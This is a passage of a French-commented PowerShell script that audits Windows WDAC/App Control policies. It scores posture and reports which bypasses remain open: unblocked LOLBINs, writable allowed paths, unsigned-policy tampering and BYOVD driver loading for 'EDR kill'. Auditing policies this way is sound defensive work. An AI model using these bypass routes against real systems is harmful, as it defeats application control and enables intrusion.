    foreach ($fp in ($m.EffAllowFilePaths | Select-Object -Unique)) {
        $t = Test-WDACPathWritable $fp
        $out += [ordered]@{ Path=$fp; Resolved=$t.Resolved; State=$t.State; By=$t.By }
    }
    $m.WritablePaths = @($out)
    $m.HasWritableAllowPath = @($out | Where-Object { $_.State -eq "WRITABLE" -or $_.State -eq "HEURISTIC" }).Count -gt 0
}

# ============================================================================
#  EVALUATION : un LOLBIN est-il jouable sous cette politique ? (utilise EffDenyRules)
# ============================================================================
function Get-LOLBASVerdict {
    param($m, $entry)
    $fn = $entry.File.ToLower()
    $isKernel = $fn.EndsWith(".sys")
    if ($m.IsSupplemental) {
        return @{ Verdict="N/A"; Reason="Politique supplementaire (n'impose rien, ajoute des allow a la base)" }
    }
    if ($m.IsAudit) {
        return @{ Verdict="POSSIBLE"; Reason="AUDIT MODE : la politique n'empeche rien (log seulement)" }
    }
    if (-not $isKernel -and -not $m.HasUMCI) {
        return @{ Verdict="POSSIBLE"; Reason="UMCI absent : aucun controle user-mode (EXE/DLL/script)" }
    }
    $d = Test-DenyByName $fn $m.EffDenyRules
    if ($d.Blocked -and $d.Scope -eq "ALL") {
        return @{ Verdict="BLOQUE"; Reason=("Deny by FileName present ({0})" -f $d.Detail) }
    }
    if ($d.Blocked -and $d.Scope -eq "BOUNDED") {
        return @{ Verdict="PARTIEL"; Reason=("Deny borne : {0}" -f $d.Detail) }
    }
    return @{ Verdict="POSSIBLE"; Reason="Binaire signe MS, non present dans la blocklist -> execute" }
}

# ============================================================================
#  [B] SCORE DE POSTURE (par base effective)
# ============================================================================
function Get-PostureScore {
    param($m, $missingBlock, $vulnAllowHashCount)
    $score = 100
    $weak = @()  # @{ W=<poids>; T=<texte> }
    if ($m.IsAudit) { $score -= 100; $weak += @{ W=100; T="Base en AUDIT : ne bloque rien (execution libre)" } }
    if (-not $m.HasUMCI) { $score -= 60; $weak += @{ W=60; T="UMCI absent : user-mode (EXE/DLL/scripts) non controle" } }
    if ($m.HasUnsigned) { $score -= 15; $weak += @{ W=15; T="Politique NON signee : falsifiable par un admin (CiTool)" } }
    if ($m.HasNoReboot -and $m.AllowSupplemental) { $score -= 12; $weak += @{ W=12; T="No-Reboot + Allow Supplemental : AllowAll deployable a chaud" } }
    elseif ($m.HasNoReboot) { $score -= 5; $weak += @{ W=5; T="Update Policy No Reboot : changement de politique immediat" } }
    if ($m.HasManagedInstaller) { $score -= 8; $weak += @{ W=8; T="Managed Installer actif : tag de confiance exploitable" } }
    if ($m.HasISG) { $score -= 8; $weak += @{ W=8; T="ISG actif : binaires 'known good' auto-autorises (reputation)" } }
    $mb = [Math]::Min($missingBlock, 25)
    if ($mb -gt 0) { $score -= $mb; $weak += @{ W=$mb; T=("Blocklist Microsoft incomplete : {0} LOLBIN(s) recommande(s) non bloque(s)" -f $missingBlock) } }
    $wp = @($m.WritablePaths | Where-Object { $_.State -eq "WRITABLE" }).Count
    $hp = @($m.WritablePaths | Where-Object { $_.State -eq "HEURISTIC" }).Count
    if ($wp -gt 0) { $d=[Math]::Min($wp*20,40); $score -= $d; $weak += @{ W=$d; T=("{0} FilePath allow INSCRIPTIBLE (user) confirme(s) par ACL" -f $wp) } }
    elseif ($hp -gt 0) { $d=[Math]::Min($hp*10,20); $score -= $d; $weak += @{ W=$d; T=("{0} FilePath allow dans une zone typiquement inscriptible" -f $hp) } }
    if ($m.PublisherWideSigners.Count -gt 50) { $score -= 10; $weak += @{ W=10; T=("{0} signers publisher-wide : surface d'editeur tres large" -f $m.PublisherWideSigners.Count) } }
    if ($vulnAllowHashCount -gt 0) { $score -= 30; $weak += @{ W=30; T=("{0} hash ALLOW correspond(ent) a un driver vulnerable connu (LOLDrivers)" -f $vulnAllowHashCount) } }

    if ($score -lt 0) { $score = 0 }
    $grade = if ($score -ge 85) { "A" } elseif ($score -ge 70) { "B" } elseif ($score -ge 55) { "C" } elseif ($score -ge 40) { "D" } else { "F" }
    $top = @($weak | Sort-Object { $_.W } -Descending | Select-Object -First 3 | ForEach-Object { $_.T })
    return @{ Score=$score; Grade=$grade; Top=$top }
}

# ============================================================================
#  ANALYSE + AFFICHAGE D'UNE POLITIQUE
# ============================================================================
$AllModels = @()

function Show-Policy {
    param($m)

    W ""
    W $bar "Cyan"
    W ("  POLITIQUE : {0}   [{1}]" -f $m.Name, $m.File) "Cyan"
    W $bar "Cyan"
    W ("  Type      : {0}" -f $m.PolicyType) "White"
    W ("  PolicyID  : {0}" -f $m.PolicyID) "DarkGray"
    W ("  BasePolicy: {0}" -f $m.BasePolicyID) "DarkGray"
    W ("  Version   : {0}" -f $m.Version) "DarkGray"
    if (-not $m.IsSupplemental -and $m.Supplementals.Count -gt 0) {
        W ("  Supplement: {0} politique(s) fusionnee(s) -> {1}" -f $m.Supplementals.Count, (($m.Supplementals | ForEach-Object { $_.Name }) -join ", ")) "DarkYellow"
    }

    # --- Etat d'enforcement ---
    W ""
    W "  [ETAT DE LA POLITIQUE]" "Yellow"
    $enfTxt = if ($m.IsSupplemental) { "SUPPLEMENTALE (ajoute des allow a la base)" }
              elseif ($m.IsAudit)    { "AUDIT ONLY -> NE BLOQUE RIEN (log 3076/3077)" }
              elseif (-not $m.HasUMCI){ "ENFORCED mais UMCI ABSENT -> user-mode NON controle" }
              else                    { "ENFORCED + UMCI -> user-mode controle" }
    $enfCol = if ($m.IsAudit -or (-not $m.HasUMCI -and -not $m.IsSupplemental)) { "Red" } else { "Green" }
    W ("    Enforcement : {0}" -f $enfTxt) $enfCol
    foreach ($o in $m.Options) {
        $c = if ($o -match "Audit|Unsigned|No Reboot") { "Red" } elseif ($o -match "UMCI") { "Green" } else { "DarkGray" }
        W ("      - {0}" -f $o) $c
    }

    # --- CE QUI EST AUTORISE ---
    W ""
    W "  [AUTORISE]" "Green"
    W ("    Allow by hash     : {0}" -f $m.AllowHashCount) "Gray"
    W ("    Allow by FileName : {0}" -f $m.AllowFileNames.Count) "Gray"
    W ("    Allow by FilePath : {0}" -f $m.AllowFilePaths.Count) "Gray"
    foreach ($fp in $m.AllowFilePaths) { W ("        PATH> {0}" -f $fp) "Cyan" }
    W ("    Signers user-mode : {0}   (dont publisher-wide: {1})" -f $m.AllowedUserSigners.Count, $m.PublisherWideSigners.Count) "Gray"
    W ("    Signers kernel    : {0}" -f $m.AllowedKernelSigners.Count) "Gray"

    if ($m.PublisherWideSigners.Count -gt 0) {
        W "    Signers SANS contrainte (tout binaire de l'editeur passe) :" "DarkYellow"
        foreach ($sid in ($m.PublisherWideSigners | Select-Object -First 40)) {
            $s = $m.Signers[$sid]
            $pub = if ($s.Publisher) { $s.Publisher } else { "root=$($s.RootType):$($s.RootValue)" }
            W ("        SIGNER> {0}  [{1}]" -f $pub, $sid) "DarkYellow"
        }
        if ($m.PublisherWideSigners.Count -gt 40) { W ("        ... (+{0})" -f ($m.PublisherWideSigners.Count-40)) "DarkGray" }
    }
    if ($ShowAllowed -and $m.AllowFileNames.Count -gt 0) {
        W "    Allow FileName (liste) :" "DarkGray"
        foreach ($n in ($m.AllowFileNames | Select-Object -Unique)) { W ("        + {0}" -f $n) "DarkGray" }
    }

    # --- [D] CHEMINS FILEPATH INSCRIPTIBLES ---
    if ($m.WritablePaths.Count -gt 0) {
        W ""
        W "  [D] FILEPATH ALLOW - TEST D'INSCRIPTIBILITE (bypass sans admin si writable)" "Magenta"
        foreach ($wp in $m.WritablePaths) {
            $col = switch ($wp.State) { "WRITABLE" { "Red" } "HEURISTIC" { "Yellow" } "SAFE" { "Green" } default { "DarkGray" } }
            $tag = switch ($wp.State) {
                "WRITABLE"  { "INSCRIPTIBLE (ACL user)  -> DEPOSE+EXEC sans admin" }
                "HEURISTIC" { "ZONE SUSPECTE (non teste/absent, chemin type writable)" }
                "SAFE"      { "protege (pas d'ecriture user)" }
                "ABSENT"    { "chemin absent sur cette machine (ACL non testable)" }
                "SKIP"      { "test ACL desactive (-NoAcl)" }
                default     { $wp.State }
            }
            W ("    [{0,-10}] {1}" -f $wp.State, $wp.Path) $col
            W ("               -> {0}  {1}" -f $wp.Resolved, $(if ($wp.By) { "(" + $wp.By + ")" } else { "" })) "DarkGray"
            W ("               {0}" -f $tag) $col
        }
    }

    # --- CE QUI EST INTERDIT ---
    W ""
    W "  [INTERDIT]" "Red"
    W ("    Deny by hash      : {0}" -f $m.DenyHashCount) "Gray"
    W ("    Deny by FileName  : {0}  (LOLBIN blocklist)" -f $m.DenyFileNames.Count) "Gray"
    W ("    Denied signers    : {0}" -f $m.DeniedSigners.Count) "Gray"
    if ($ShowAllowed -and $m.DenyFileNames.Count -gt 0) {
        W "    Deny FileName (liste) :" "DarkGray"
        foreach ($n in $m.DenyFileNames) { W ("        - {0}" -f $n) "DarkGray" }
    }

    # --- [C] COUVERTURE BLOCKLIST MICROSOFT ---
    if (-not $m.IsSupplemental) {
        $present = @($m.EffDenyRules | ForEach-Object { $_.Name } | Select-Object -Unique)
        $missing = @($MSBlockList | Where-Object { $present -notcontains $_ })
        $partial = @()
        foreach ($nm in ($MSBlockList | Where-Object { $present -contains $_ })) {
            $d = Test-DenyByName $nm $m.EffDenyRules
            if ($d.Scope -eq "BOUNDED") { $partial += $nm }
        }
        W ""
        W "  [C] COUVERTURE BLOCKLIST MICROSOFT" "Magenta"
        W ("    Reference locale : {0} noms surveilles | Presents : {1} | MANQUANTS : {2}" -f $MSBlockList.Count, ($MSBlockList.Count-$missing.Count), $missing.Count) "White"
        if ($missing.Count -gt 0) {
            W "    LOLBINs recommandes NON bloques (executables tels quels) :" "Red"
            $line = "        "
            $i = 0
            foreach ($mm in ($missing | Sort-Object)) {
                $line += ("{0}  " -f $mm); $i++
                if ($i % 4 -eq 0) { W $line "Red"; $line = "        " }
            }
            if ($line.Trim() -ne "") { W $line "Red" }
        } else {
            W "    Tous les noms surveilles sont couverts." "Green"
        }
        if ($partial.Count -gt 0) {
            W ("    Deny BORNE (contournable par version) : {0}" -f ($partial -join ", ")) "Yellow"
        }
        $m.MissingBlockCount = $missing.Count
    }

    # --- DIFF LOLBAS (verdict sur base EFFECTIVE) ---
    W ""
    W "  [DIFF LOLBAS]  (https://lolbas-project.github.io/)" "Magenta"
    W ("    {0,-28} {1,-9} {2}" -f "Binaire", "Verdict", "Raison") "DarkGray"
    $lolPossible=0; $lolBlocked=0; $lolPartial=0
    foreach ($e in $LOLBAS) {
        $v = Get-LOLBASVerdict $m $e
        if ($v.Verdict -eq "N/A") { continue }
        $col = switch ($v.Verdict) { "POSSIBLE" { "Red" } "PARTIEL" { "Yellow" } "BLOQUE" { "Green" } default { "Gray" } }
        switch ($v.Verdict) { "POSSIBLE" { $lolPossible++ } "PARTIEL" { $lolPartial++ } "BLOQUE" { $lolBlocked++ } }
        W ("    {0,-28} {1,-9} {2}" -f $e.File, $v.Verdict, $v.Reason) $col
        if ($POC -and ($v.Verdict -eq "POSSIBLE" -or $v.Verdict -eq "PARTIEL")) {
            W ("        ATT&CK {0} | TECH> {1}" -f $e.Att, $e.Tech) "DarkGray"
            W ("        POC > {0}" -f $e.POC) "Yellow"
        }
    }
    W ("    => POSSIBLE: {0}   PARTIEL(version): {1}   BLOQUE: {2}" -f $lolPossible, $lolPartial, $lolBlocked) "White"

    # --- DIFF bohops / UltimateWDACBypassList ---
    W ""
    W "  [DIFF bohops UltimateWDACBypassList]  (https://github.com/bohops/UltimateWDACBypassList)" "Magenta"
    foreach ($b in $Bohops) {
        if ($m.IsSupplemental -and $b.Name -notmatch "Supplemental|policy|writable") { continue }
        $blocked = & $b.Blk $m
        $userTech = ($b.Admin -eq $false)
        if ($userTech -and ($m.IsAudit -or (-not $m.HasUMCI -and -not $m.IsSupplemental))) { $blocked = $false }
        $verdict = if ($blocked) { "BLOQUE" } else { "POSSIBLE" }
        $col = if ($blocked) { "Green" } else { "Red" }
        $adminTag = if ($b.Admin) { "[ADMIN]" } else { "[user] " }
        W ("    {0} {1,-9} {2,-32} {3}" -f $adminTag, $verdict, $b.Name, $b.Ref) $col
        W ("             {0}" -f $b.Desc) "DarkGray"
    }

    # --- DIFF LOLDrivers (BYOVD) ---
    W ""
    W "  [DIFF LOLDrivers - BYOVD]  (https://www.loldrivers.io/)" "Magenta"
    if ($m.IsSupplemental) {
        W "    (supplementale : l'enforcement kernel vient de la base)" "DarkGray"
    } else {
        $driverBlockable = ($m.HasUMCI -and -not $m.IsAudit)
        $shown = 0
        foreach ($d in $LOLDrivers) {
            $shown++
            if ($shown -gt 40) { W ("    ... (+{0} autres drivers)" -f ($LOLDrivers.Count-40)) "DarkGray"; break }
            $dd = Test-DenyByName $d.File $m.EffDenyRules
            $isBlocked = $driverBlockable -and $dd.Blocked -and $dd.Scope -eq "ALL"
            $verdict = if ($m.IsAudit) { "POSSIBLE" } elseif ($isBlocked) { "BLOQUE" } elseif ($dd.Blocked) { "PARTIEL" } else { "POSSIBLE" }
            $col = switch ($verdict) { "BLOQUE" { "Green" } "PARTIEL" { "Yellow" } default { "Red" } }
            W ("    [ADMIN] {0,-9} {1,-22} {2}  ({3})" -f $verdict, $d.File, $d.Desc, $d.CVE) $col
        }
        W "    Note: charger un driver EXIGE l'admin. WDAC bloque les .sys non signes;" "DarkGray"
        W "          le BYOVD reste possible avec un driver signe non present en deny." "DarkGray"

        # [G] Croisement hash ALLOW <-> samples de drivers vulnerables
        if ($m.VulnAllowHashes -and $m.VulnAllowHashes.Count -gt 0) {
            W "    [G] ALERTE : des hash ALLOW correspondent a des drivers vulnerables connus :" "Red"
            foreach ($h in $m.VulnAllowHashes) { W ("        ALLOW-HASH> {0}  ({1})" -f $h.Hash, $h.Driver) "Red" }
        }
    }

    # --- [B] SCORE DE POSTURE ---
    if (-not $m.IsSupplemental) {
        $missBlk = if ($null -ne $m.MissingBlockCount) { $m.MissingBlockCount } else { 0 }
        $vulnCnt = if ($m.VulnAllowHashes) { $m.VulnAllowHashes.Count } else { 0 }
        $ps = Get-PostureScore $m $missBlk $vulnCnt
        $m.PostureScore = $ps.Score; $m.PostureGrade = $ps.Grade; $m.PostureTop = $ps.Top
        W ""
        $gcol = switch ($ps.Grade) { "A" { "Green" } "B" { "Green" } "C" { "Yellow" } "D" { "Red" } default { "Red" } }
        W ("  [B] SCORE DE POSTURE : {0}/100  ->  GRADE {1}" -f $ps.Score, $ps.Grade) $gcol
        if ($ps.Top.Count -gt 0) {
            W "      Principales faiblesses :" "White"
            foreach ($t in $ps.Top) { W ("        ! {0}" -f $t) "Red" }
        } else {
            W "      Aucune faiblesse majeure detectee." "Green"
        }
    }

    # --- Verdict synthetique (sans/avec admin) sur base EFFECTIVE ---
    $m.SummaryNoAdmin = @()
    $m.SummaryAdmin   = @()
    if (-not $m.IsSupplemental) {
        if ($m.IsAudit) {
            $m.SummaryNoAdmin += "Politique en AUDIT : execution libre de tout code (rien n'est bloque)."
        } elseif (-not $m.HasUMCI) {
            $m.SummaryNoAdmin += "UMCI absent : tous les LOLBINs user-mode + scripts s'executent."
        } else {
            $notBlocked = @()
            foreach ($e in $LOLBAS) {
                if ($e.File.ToLower().EndsWith('.sys')) { continue }
                $d = Test-DenyByName $e.File $m.EffDenyRules
                if (-not ($d.Blocked -and $d.Scope -eq "ALL")) { $notBlocked += $e.File }
            }
            if ($notBlocked.Count -gt 0) {
                $m.SummaryNoAdmin += ("LOLBINs signes MS non bloques (ou deny borne): " + ($notBlocked -join ", "))
            }
            $wpaths = @($m.WritablePaths | Where-Object { $_.State -eq "WRITABLE" })
            if ($wpaths.Count -gt 0) {
                $m.SummaryNoAdmin += ("FilePath allow INSCRIPTIBLE (ACL user) -> depose+exec: " + (($wpaths | ForEach-Object { $_.Resolved }) -join "; "))
            }
            if ($m.HasManagedInstaller) { $m.SummaryNoAdmin += "Managed Installer actif : tag de confiance exploitable." }
            if ($m.HasISG) { $m.SummaryNoAdmin += "ISG actif : binaires 'known good' auto-autorises." }
        }
        if ($m.HasUnsigned) { $m.SummaryAdmin += "Politique NON signee : admin remplace/supprime le .cip (CiTool)." }
        if ($m.HasNoReboot -and $m.AllowSupplemental) { $m.SummaryAdmin += "Supplementale AllowAll active sans reboot." }
        elseif ($m.HasNoReboot) { $m.SummaryAdmin += "Update Policy No Reboot : changement de politique immediat." }
        $m.SummaryAdmin += "BYOVD : charger un driver signe vulnerable (LOLDrivers) pour kernel/EDR kill."
    } else {
        $m.SummaryNoAdmin += ("Ajoute des autorisations a la base " + $m.BasePolicyID + " (elargit la surface).")
        $wpaths = @($m.WritablePaths | Where-Object { $_.State -eq "WRITABLE" -or $_.State -eq "HEURISTIC" })
        if ($wpaths.Count -gt 0) {
            $m.SummaryNoAdmin += ("Autorise par chemin (writable): " + (($wpaths | ForEach-Object { $_.Path }) -join "; ") + " -> hijack.")
        }
    }
}

# ============================================================================
#  RESOLUTION DES FICHIERS
# ============================================================================
$xmlFiles = @()
if ($Folder -or ((Test-Path $Path) -and (Get-Item $Path).PSIsContainer)) {
    $xmlFiles = @(Get-ChildItem -Path $Path -Filter "*.xml" -Recurse | Sort-Object Name)
} else {
    $xmlFiles = @(Get-Item $Path)
}
if ($xmlFiles.Count -eq 0) { Write-Error "Aucun .xml trouve dans $Path"; exit 1 }

W ""
W $bar "Cyan"
W ("  WDAC AUDIT v2 - {0} FICHIER(S)  -  {1}" -f $xmlFiles.Count, (Get-Date -Format "yyyy-MM-dd HH:mm")) "Cyan"
W $bar "Cyan"

# [G] Mise a jour LOLDrivers si demande (avant analyse)
if ($UpdateLOLDrivers) {
    $live = Update-LOLDriversDb -Url $LOLDriversUrl
    if ($live) { $LOLDrivers = $live }
}
# Index des hash de drivers vulnerables connus (pour croisement [G])
$script:VulnHashIndex = @{}
foreach ($d in $LOLDrivers) {
    if ($d.Hashes) { foreach ($h in $d.Hashes) { if ($h) { $script:VulnHashIndex[$h.ToUpper()] = $d.File } } }
}

# --- Pass 1 : parsing ---
foreach ($f in $xmlFiles) {
    try {
        [xml]$xml = Get-Content $f.FullName -Raw
        if (-not $xml.SiPolicy) { W ("  [SKIP] {0} : pas une politique SiPolicy" -f $f.Name) "DarkGray"; continue }
        $m = Get-WDACModel $xml $f.Name
        $AllModels += $m
    } catch {
        W ("  [ERREUR] {0} : {1}" -f $f.Name, $_.Exception.Message) "Red"
    }
}

# --- [A] Fusion base + supplementaux ---
Merge-EffectivePolicies $AllModels

# --- [D]+[G] enrichissement par modele ---
foreach ($m in $AllModels) {
    Resolve-WritablePaths $m
    # [G] croisement hash allow effectifs <-> drivers vulnerables
    $vuln = @()
    foreach ($h in $m.EffAllowHashes) {
        if ($script:VulnHashIndex.ContainsKey($h)) { $vuln += @{ Hash=$h; Driver=$script:VulnHashIndex[$h] } }
    }
    $m.VulnAllowHashes = @($vuln)
}

# --- Pass 2 : affichage ---
foreach ($m in $AllModels) { Show-Policy $m }

# ============================================================================
#  RECAP GLOBAL POUR L'AUDIT
# ============================================================================
W ""
W $bar "Cyan"
W "  RECAP GLOBAL POUR L'AUDIT" "Cyan"
W $bar "Cyan"

W ""
W "  Politiques analysees :" "Yellow"
foreach ($m in $AllModels) {
    $state = if ($m.IsSupplemental) { "SUPPL." } elseif ($m.IsAudit) { "AUDIT " } elseif (-not $m.HasUMCI) { "NO-UMCI" } else { "ENFORCE" }
    $col = if ($m.IsAudit -or (-not $m.HasUMCI -and -not $m.IsSupplemental)) { "Red" } else { "Green" }
    $grade = if ($null -ne $m.PostureGrade) { (" [{0} {1}/100]" -f $m.PostureGrade, $m.PostureScore) } else { "" }
    W ("    [{0}] {1,-14} {2}{3}  (base={4})" -f $state, $m.Name, $m.File, $grade, $m.BasePolicyID) $col
}

$enforcedBases = @($AllModels | Where-Object { -not $_.IsSupplemental -and -not $_.IsAudit })
$auditBases    = @($AllModels | Where-Object { -not $_.IsSupplemental -and $_.IsAudit })
$supplementals = @($AllModels | Where-Object { $_.IsSupplemental })

W ""
W "  Analyse d'enforcement effective (base + supplementaux fusionnes) :" "Yellow"
W ("    Bases ENFORCEES : {0}" -f $enforcedBases.Count) "White"
foreach ($b in $enforcedBases) {
    W ("      -> {0} ({1})  +{2} suppl.  score={3}/{4}" -f $b.Name, $b.File, $b.Supplementals.Count, $b.PostureScore, $b.PostureGrade) "Green"
}
W ("    Bases en AUDIT  : {0}  (ne bloquent rien)" -f $auditBases.Count) "White"
foreach ($b in $auditBases) { W ("      -> {0} ({1}) : execution libre" -f $b.Name, $b.File) "Red" }
W ("    Supplementales  : {0}  (elargissent les allow)" -f $supplementals.Count) "White"
foreach ($s in $supplementals) { W ("      -> {0} ({1}) -> base {2}" -f $s.Name, $s.File, $s.BasePolicyID) "Cyan" }

# ---- SANS ADMIN ----
W ""
W $dash "DarkGray"
W "  >>> EXECUTABLE SANS ADMIN <<<" "Green"
W $dash "DarkGray"
$anyNoAdmin = $false
foreach ($m in $AllModels) {
    if ($m.SummaryNoAdmin.Count -eq 0) { continue }
    $anyNoAdmin = $true
    W ("  [{0} / {1}]" -f $m.Name, $m.File) "White"
    foreach ($line in $m.SummaryNoAdmin) { W ("     * {0}" -f $line) "Green" }
}
if (-not $anyNoAdmin) { W "  (rien d'evident sans admin)" "DarkGray" }

# ---- AVEC ADMIN ----
W ""
W $dash "DarkGray"
W "  >>> NECESSITE ADMIN <<<" "Red"
W $dash "DarkGray"
$anyAdmin = $false
foreach ($m in $AllModels) {
    if ($m.SummaryAdmin.Count -eq 0) { continue }
    $anyAdmin = $true
    W ("  [{0} / {1}]" -f $m.Name, $m.File) "White"
    foreach ($line in $m.SummaryAdmin) { W ("     * {0}" -f $line) "Red" }
}
if (-not $anyAdmin) { W "  (rien d'evident cote admin)" "DarkGray" }

# ---- Verdict global lab ----
W ""
W $dash "DarkGray"
W "  VERDICT GLOBAL" "Yellow"
if ($enforcedBases.Count -gt 0) {
    $worst = ($enforcedBases | Sort-Object { $_.PostureScore } | Select-Object -First 1)
    W ("    Meilleure posture des bases enforcees : {0}/100 (grade {1}, base {2})" -f $worst.PostureScore, $worst.PostureGrade, $worst.Name) "White"
}
if ($auditBases.Count -gt 0 -and $enforcedBases.Count -eq 0) {
    W "    Aucune base enforcee -> WDAC ne bloque RIEN sur cette machine." "Red"
} elseif ($enforcedBases.Count -gt 0) {
    W ("    {0} base(s) enforcee(s). Bypass sans admin via LOLBINs signes non bloques" -f $enforcedBases.Count) "White"
    W "    et/ou FilePath writable ; escalade kernel via BYOVD (admin requis)." "White"
    if ($auditBases.Count -gt 0) {
        W ("    ATTENTION: {0} base(s) en AUDIT presentes -> potentiellement non applique." -f $auditBases.Count) "Red"
    }
}
W ""
W "  References: LOLBAS https://lolbas-project.github.io/ | LOLDrivers https://www.loldrivers.io/" "Magenta"
W "              bohops https://github.com/bohops/UltimateWDACBypassList" "Magenta"
W ""

# ============================================================================
#  EXPORT JSON OPTIONNEL (machine-lisible)
# ============================================================================
if ($Json) {
    $export = foreach ($m in $AllModels) {
        [ordered]@{
            File=$m.File; Name=$m.Name; Type=$m.PolicyType
            PolicyID=$m.PolicyID; BasePolicyID=$m.BasePolicyID; Version=$m.Version
            IsSupplemental=$m.IsSupplemental; IsAudit=$m.IsAudit; HasUMCI=$m.HasUMCI
            HasUnsigned=$m.HasUnsigned; HasISG=$m.HasISG; HasManagedInstaller=$m.HasManagedInstaller
            PostureScore=$m.PostureScore; PostureGrade=$m.PostureGrade; PostureTop=$m.PostureTop
            MissingBlockCount=$m.MissingBlockCount
            SupplementalsMerged=@($m.Supplementals | ForEach-Object { $_.Name })
            WritablePaths=@($m.WritablePaths)
            VulnAllowHashes=@($m.VulnAllowHashes)
            SummaryNoAdmin=$m.SummaryNoAdmin; SummaryAdmin=$m.SummaryAdmin
        }
    }
    $export | ConvertTo-Json -Depth 6 | Set-Content -Path $Json -Encoding UTF8
    Write-Host ("  [JSON ecrit] {0}" -f (Resolve-Path $Json)) -ForegroundColor Cyan
}

# ============================================================================
#  RAPPORT MARKDOWN OPTIONNEL
# ============================================================================
if ($Report) {
    $header = @(
        "# WDAC / App Control - Rapport d'audit",
        "",
        ("Genere le {0} - {1} fichier(s)." -f (Get-Date -Format "yyyy-MM-dd HH:mm"), $xmlFiles.Count),
        "",
        "Sources: [LOLBAS](https://lolbas-project.github.io/), [LOLDrivers](https://www.loldrivers.io/), [bohops UltimateWDACBypassList](https://github.com/bohops/UltimateWDACBypassList).",
        "",
        ('`' + '``text')
    )
    $footer = @('`' + '``')
    $clean = New-Object System.Collections.Generic.List[string]
    $prevBlank = $false
    foreach ($ln in $script:MD) {
        $isBlank = [string]::IsNullOrWhiteSpace($ln)
        if ($isBlank -and $prevBlank) { continue }
        $clean.Add($ln)
        $prevBlank = $isBlank
    }
    ($header + $clean + $footer) | Set-Content -Path $Report -Encoding UTF8
    Write-Host ("  [Rapport ecrit] {0}" -f (Resolve-Path $Report)) -ForegroundColor Cyan
}
